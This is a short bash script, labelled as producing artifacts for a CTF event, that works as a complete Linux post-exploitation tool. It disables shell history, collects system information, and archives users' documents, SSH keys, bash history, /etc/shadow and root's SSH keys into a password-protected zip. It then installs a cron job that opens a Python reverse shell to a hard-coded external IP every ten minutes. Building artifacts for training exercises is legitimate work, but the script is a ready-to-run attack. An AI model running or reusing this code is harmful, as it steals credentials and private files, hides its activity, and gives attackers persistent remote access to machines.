#!/bin/bash
# script to generate Linux artifacts for CTF event
# Jon Nelson, jnelson@carbonblack.com

out=/mnt/fileserver/.linux-disc.txt
loot=/mnt/fileserver/.linux-loot.tar

#Disable history for this session
set +o history

# Discovery and store to file
declare -a cmds=("date" "who" "mount" "ps aux" "netstat -anp" "route" "ifconfig -a" "iptables -L")
for i in "${cmds[@]}";do 
	echo -e "\n$i" >> $out
	printf '=%.0s' {1..100} >> $out 
	echo -e "\n" >> $out
	$i >> $out
done
# Put results in an archive
tar -cf $loot $out

# Find docs and put them in the archive
find /home/ -name "*.doc" -o -name "*.xls" -o -name "*.pdf" -type f | xargs tar -rf $loot

# Find ssh folders and put them in the archive
for i in $(ls /home 2>/dev/null);do 
	if ls /home/$i/.ssh 2>/dev/null;then 
		tar -rf $loot /home/$i/.ssh 2>/dev/null	
	fi
	# Also grab some other files
	tar -rf $loot /home/$i/.{bash_history,bashrc,bash_profile} 2>/dev/null
done

# Other files for the archive
tar -rf $loot /etc/shadow /root/.ssh

# Zip everything
zip -P m90*aHEf2FHY $loot.zip $loot

# Setup reverse shell reaching out every 10 minutes
crontab -l > cron.tmp
echo "0-59/10 * * * * python -c 'import socket, subprocess, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("174.138.4.185",7387)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/bash", "-i"]);'" >> cron.tmp
crontab cron.tmp
rm -f cron.tmp
